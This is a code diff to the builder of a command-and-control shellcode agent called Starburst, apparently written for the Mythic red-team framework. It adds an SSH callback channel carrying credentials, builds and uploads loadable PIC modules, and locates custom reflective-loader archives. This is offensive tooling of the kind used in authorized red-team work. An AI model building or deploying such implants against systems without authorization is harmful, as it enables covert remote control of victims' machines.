@@ -15,6 +15,75 @@ from ..crystal_utilities import _wrap_shellcode_in_dll
 logger = logging.getLogger("starburst.builder")
 
 
+def _make_env():
+    env = os.environ.copy()
+    extra = [d for d in [r"C:\msys64\mingw64\bin", r"C:\msys64\mingw32\bin",
+                          "/usr/bin", "/usr/local/bin"] if os.path.isdir(d)]
+    if extra:
+        env["PATH"] = os.pathsep.join(extra) + os.pathsep + env.get("PATH", "")
+    return env
+
+
+def _find_spec_dir(root, role="loader"):
+    """Find the directory containing loader.spec inside an extracted archive.
+
+    Handles:
+    - Flat layout: loader.spec at root
+    - Nested layout: loader/, local-loader/, postex-loader/, etc.
+    - Role-based: 'loader' prefers dirs named 'loader' or containing 'local',
+                  'postex' prefers dirs containing 'postex' or 'post-ex'
+    """
+    root_spec = os.path.join(root, "loader.spec")
+    if os.path.isfile(root_spec):
+        subdirs = [d for d in sorted(os.listdir(root))
+                    if os.path.isdir(os.path.join(root, d))
+                    and os.path.isfile(os.path.join(root, d, "loader.spec"))]
+        if not subdirs:
+            return root
+
+    spec_dirs = []
+    for entry in sorted(os.listdir(root)):
+        entry_path = os.path.join(root, entry)
+        if os.path.isdir(entry_path) and os.path.isfile(os.path.join(entry_path, "loader.spec")):
+            spec_dirs.append((entry.lower(), entry_path))
+
+    if not spec_dirs:
+        if os.path.isfile(root_spec):
+            return root
+        return None
+
+    if len(spec_dirs) == 1:
+        return spec_dirs[0][1]
+
+    is_postex = lambda n: "postex" in n or "post-ex" in n or "post_ex" in n
+
+    if role == "postex":
+        for name, path in spec_dirs:
+            if is_postex(name):
+                return path
+    else:
+        exact = [p for n, p in spec_dirs if n == "loader"]
+        if exact:
+            return exact[0]
+        for name, path in spec_dirs:
+            if not is_postex(name):
+                return path
+
+    return spec_dirs[0][1]
+
+
+def _find_make_dir(root):
+    """Find the directory to run make in - top-level if Makefile exists there,
+    otherwise the first subdir with a Makefile."""
+    if os.path.isfile(os.path.join(root, "Makefile")):
+        return root
+    for entry in os.listdir(root):
+        entry_path = os.path.join(root, entry)
+        if os.path.isdir(entry_path) and os.path.isfile(os.path.join(entry_path, "Makefile")):
+            return entry_path
+    return root
+
+
 class Starburst(PayloadType):
     name = "starburst"
     file_extension = "bin"
@@ -25,7 +94,7 @@ class Starburst(PayloadType):
     wrapped_payloads = ["erebus_wrapper", "service_wrapper", "scarecrow_wrapper"]
     note = "PIC shellcode agent based on Stardust framework and Crystal Palace."
     supports_dynamic_loading = True
-    c2_profiles = ["http", "httpx", "github", "smb", "tcp"]
+    c2_profiles = ["http", "httpx", "github", "smb", "tcp", "ssh"]
     mythic_encrypts = True
     translation_container = "StarburstTranslator"
 
@@ -196,6 +265,7 @@ class Starburst(PayloadType):
         BuildStep(step_name="Configuring", step_description="Stamping config into agent"),
         BuildStep(step_name="Compiling", step_description="Building PIC shellcode"),
         BuildStep(step_name="Wrapping", step_description="Producing final artifact"),
+        BuildStep(step_name="Module Build", step_description="Building PIC modules for load command"),
     ]
 
     async def build(self) -> BuildResponse:
@@ -242,6 +312,8 @@ class Starburst(PayloadType):
                 transport_define = "#define SMB_TRANSPORT"
             elif c2_profile_name == "tcp":
                 transport_define = "#define TCP_TRANSPORT"
+            elif c2_profile_name == "ssh":
+                transport_define = "#define SSH_TRANSPORT"
 
             import logging
             logger = logging.getLogger("starburst.builder")
@@ -380,6 +452,73 @@ class Starburst(PayloadType):
                 StepSuccess=True,
             ))
 
+            # Build PIC modules for dynamic loading
+            import asyncio as _aio
+            mod_arch = arch.split("-")[0] if "-" in arch else arch
+            try:
+                mod_proc = await _aio.create_subprocess_exec(
+                    "make", f"modules-{mod_arch}",
+                    cwd=dst_path,
+                    stdout=_aio.subprocess.PIPE,
+                    stderr=_aio.subprocess.PIPE,
+                )
+                mod_stdout, mod_stderr = await _aio.wait_for(
+                    mod_proc.communicate(), timeout=300
+                )
+                mod_stdout_str = mod_stdout.decode(errors="replace") if mod_stdout else ""
+                mod_stderr_str = mod_stderr.decode(errors="replace") if mod_stderr else ""
+                if mod_proc.returncode != 0:
+                    logger.warning(f"Module build failed: {mod_stderr_str}")
+                    await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
+                        PayloadUUID=self.uuid,
+                        StepName="Module Build",
+                        StepStdout=mod_stdout_str,
+                        StepStderr=mod_stderr_str,
+                        StepSuccess=False,
+                    ))
+                else:
+                    mod_dir = os.path.join(dst_path, "bin", "modules")
+                    uploaded = []
+                    if os.path.isdir(mod_dir):
+                        for fname in sorted(os.listdir(mod_dir)):
+                            if not fname.endswith(".bin"):
+                                continue
+                            friendly = fname.replace(f".{mod_arch}.bin", ".bin")
+                            mod_path = os.path.join(mod_dir, fname)
+                            try:
+                                with open(mod_path, "rb") as f:
+                                    mod_data = f.read()
+                                file_resp = await SendMythicRPCFileCreate(MythicRPCFileCreateMessage(
+                                    PayloadUUID=self.uuid,
+                                    Filename=friendly,
+                                    FileContents=mod_data,
+                                    DeleteAfterFetch=False,
+                                    Comment=f"PIC module from {self.uuid}",
+                                ))
+                                if file_resp.Success:
+                                    uploaded.append(f"{friendly} ({len(mod_data)}b)")
+                                else:
+                                    logger.warning(f"Failed to upload module {friendly}: {file_resp.Error}")
+                            except Exception as me:
+                                logger.warning(f"Failed to upload module {fname}: {me}")
+                    if uploaded:
+                        logger.info(f"Uploaded {len(uploaded)} modules")
+                        await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
+                            PayloadUUID=self.uuid,
+                            StepName="Module Build",
+                            StepStdout=f"Built & uploaded {len(uploaded)} PIC modules:\n" + "\n".join(uploaded),
+                            StepSuccess=True,
+                        ))
+                    else:
+                        await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
+                            PayloadUUID=self.uuid,
+                            StepName="Module Build",
+                            StepStdout="No modules produced",
+                            StepSuccess=True,
+                        ))
+            except Exception as me:
+                logger.warning(f"Module build error: {me}")
+
         except Exception as e:
             resp.status = BuildStatus.Error
             resp.build_stderr = str(e)
@@ -484,6 +623,23 @@ class Starburst(PayloadType):
         elif c2_profile == "tcp":
             tcp_port = int(c2_params.get("port", None) or 7000)
             buf += struct.pack(">I", tcp_port)
+
+        elif c2_profile == "ssh":
+            host = c2_params.get("callback_host", "")
+            if "://" in host:
+                host = host.split("://", 1)[1]
+            if host.endswith("/"):
+                host = host[:-1]
+            buf += self._pack_string(host)
+
+            port = int(c2_params.get("callback_port", 2222))
+            buf += struct.pack(">I", port)
+
+            buf += self._pack_string(c2_params.get("ssh_username", "agent"))
+            buf += self._pack_string(c2_params.get("ssh_password", ""))
+
+            mode = 0 if c2_params.get("connection_mode", "persistent") == "persistent" else 1
+            buf += struct.pack(">I", mode)
 
         return buf
 
@@ -683,23 +839,19 @@ class Starburst(PayloadType):
             with zipfile.ZipFile(zip_buf, 'r') as z:
                 z.extractall(udrl_dir)
 
-            make_env = os.environ.copy()
-            extra_paths = []
-            for d in [r"C:\msys64\mingw64\bin", r"C:\msys64\mingw32\bin",
-                       "/usr/bin", "/usr/local/bin"]:
-                if os.path.isdir(d):
-                    extra_paths.append(d)
-            if extra_paths:
-                make_env["PATH"] = os.pathsep.join(extra_paths) + os.pathsep + make_env.get("PATH", "")
+            make_dir = _find_make_dir(udrl_dir)
             make_proc = subprocess.run(
                 ["make", arch],
-                cwd=udrl_dir, env=make_env,
+                cwd=make_dir, env=_make_env(),
                 capture_output=True, text=True, timeout=60)
             if make_proc.returncode != 0:
                 logger.error(f"Custom UDRL compile failed: {make_proc.stderr}")
                 return None
 
-            loader_path = udrl_dir
+            loader_path = _find_spec_dir(udrl_dir, role="loader")
+            if not loader_path:
+                logger.error(f"No loader.spec found in custom UDRL archive")
+                return None
         else:
             loader_path = os.path.join(cp_path, "default")
 
@@ -767,21 +919,32 @@ class Starburst(PayloadType):
         if not postex_resp.Success:
             raise RuntimeError(f"Failed to fetch post-ex UDRL: {postex_resp.Error}")
 
-        custom_dir = os.path.join(cp_path, f"postex_{self.uuid}")
-        os.makedirs(custom_dir, exist_ok=True)
+        extract_dir = os.path.join(cp_path, f"postex_{self.uuid}_extract")
+        os.makedirs(extract_dir, exist_ok=True)
 
         import io
         zip_buf = io.BytesIO(postex_resp.Content)
         with zipfile.ZipFile(zip_buf, 'r') as z:
-            z.extractall(custom_dir)
+            z.extractall(extract_dir)
 
+        make_dir = _find_make_dir(extract_dir)
         arch = self.get_parameter("architecture")
         make_proc = subprocess.run(
             ["make", arch],
-            cwd=custom_dir,
+            cwd=make_dir, env=_make_env(),
             capture_output=True, text=True, timeout=60)
         if make_proc.returncode != 0:
             raise RuntimeError(f"Custom post-ex compile failed: {make_proc.stderr}")
+
+        postex_dir = _find_spec_dir(extract_dir, role="postex")
+        if not postex_dir:
+            raise RuntimeError("No loader.spec found in custom post-ex UDRL archive")
+
+        install_dir = os.path.join(cp_path, f"postex_{self.uuid}")
+        if os.path.exists(install_dir):
+            shutil.rmtree(install_dir)
+        shutil.copytree(postex_dir, install_dir)
+        shutil.rmtree(extract_dir, ignore_errors=True)
 
         logger.info(f"Installed custom post-ex UDRL for payload {self.uuid}")
 
